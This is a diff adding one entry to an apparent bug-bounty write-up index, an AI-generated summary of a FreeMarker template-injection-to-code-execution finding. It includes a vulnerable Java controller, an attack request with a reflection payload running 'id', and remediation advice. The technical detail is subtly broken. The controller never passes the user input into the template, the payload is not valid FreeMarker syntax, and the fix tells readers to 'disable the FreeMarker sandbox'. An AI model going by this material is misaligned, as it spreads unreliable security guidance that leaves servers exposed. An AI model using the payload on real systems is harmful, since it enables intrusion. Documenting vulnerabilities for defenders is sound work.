@@ -42,6 +42,47 @@
     "score": 53
   },
   {
+    "id": "c7994b75cb2a",
+    "title": "Critical Server-Side Template Injection (SSTI) to Remote Code Execution in Enterprise Reporting…",
+    "url": "https://medium.com/@t4nv1/critical-server-side-template-injection-ssti-to-remote-code-execution-in-enterprise-reporting-e0d3d80f0ec3",
+    "source": {
+      "slug": "medium-tag-bug-bounty",
+      "name": "Medium — #bug-bounty"
+    },
+    "authors": [
+      "T4nv1"
+    ],
+    "program": null,
+    "platform_slug": "self-disclosed",
+    "bounty_raw": null,
+    "published_at": "2026-09-26T19:21:01.000Z",
+    "added_at": "2026-09-27T01:58:58.150Z",
+    "categories": [
+      "ssti",
+      "rce"
+    ],
+    "severity": "critical",
+    "difficulty": "advanced",
+    "summary_en": "A server‑side template injection in the ERP’s FreeMarker report generator lets an unauthenticated attacker inject Java reflection code and achieve remote code execution.",
+    "summary_ar": null,
+    "lesson": {
+      "cause": "The platform lets managers upload custom invoice templates. The template content is inserted directly into a FreeMarker template without escaping. FreeMarker evaluates expressions like ${...} at render time. Because the input is not sanitized, an attacker can supply a FreeMarker expression that accesses Java classes via reflection. The default FreeMarker sandbox was disabled or bypassed, allowing the malicious expression to execute arbitrary code on the server.",
+      "walkthrough": null,
+      "example": "**Vulnerable snippet (target.example)**\n```java\n// Java controller handling template upload\n@PostMapping(\"/api/report/template\")\npublic ResponseEntity<String> uploadTemplate(@RequestBody String userTemplate) {\n    // The user‑provided template is concatenated directly into a FreeMarker template\n    String ftl = \"<html><body>${userTemplate}</body></html>\"; // ❌ unescaped insertion\n    Template template = new Template(\"report\", ftl, cfg);\n    StringWriter out = new StringWriter();\n    template.process(null, out); // renders the template\n    return ResponseEntity.ok(out.toString());\n}\n```\n**Attack request**\n```\nPOST /api/report/template HTTP/1.1\nHost: target.example\nContent-Type: application/json\n\n{\"userTemplate\":\"${\"\".class.forName('java.lang.Runtime').getRuntime().exec('id').getInputStream().readAllBytes()}\"}\n```\n**Why it works**: The server builds a FreeMarker template that contains `${...}`. FreeMarker evaluates the expression, which uses Java reflection (`class.forName`) to obtain `java.lang.Runtime` and runs the `id` command. Because the template engine’s sandbox is not enforced, the malicious expression runs with the server’s privileges, returning the command output.",
+      "takeaway": null,
+      "fix": "Validate and escape all user‑provided template data before passing it to FreeMarker. Disable the FreeMarker sandbox or configure it to deny Java class access. Use a whitelist of allowed FreeMarker directives and reject any ${...} expressions that reference java.* packages. Render user templates in a separate, low‑privilege container or sandboxed process to limit impact.",
+      "cause_ar": null,
+      "walkthrough_ar": null,
+      "example_ar": null,
+      "takeaway_ar": null,
+      "fix_ar": null
+    },
+    "excerpt": "While testing an enterprise resource planning (ERP) SaaS platform (`erp-portal.target.com`), I discovered a critical vulnerability in its custom PDF and report generation service. By identifying an unescaped field in a dynamic template creation feature and bypassing the template engine’s sandbox restrictions using Java reflection gadgets, I achieved **unauthenticated Remote Code Execution (RCE)** on the underlying infrastructure. * **Impact:** Full System Compromise / Internal Network Pivot * **Severity:** CVSS 3.1: 9.8 (Critical) `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` ## Technical Con",
+    "ai_generated": true,
+    "engagement": null,
+    "score": 60
+  },
+  {
     "id": "6025b1c305da",
     "title": "From Leaked API Key to Full Account Takeover: Uncovering a Mass PII Vulnerability",
     "url": "https://medium.com/@Brian_Bange/from-leaked-api-key-to-full-account-takeover-uncovering-a-mass-pii-vulnerability-228a4a3d6bef",
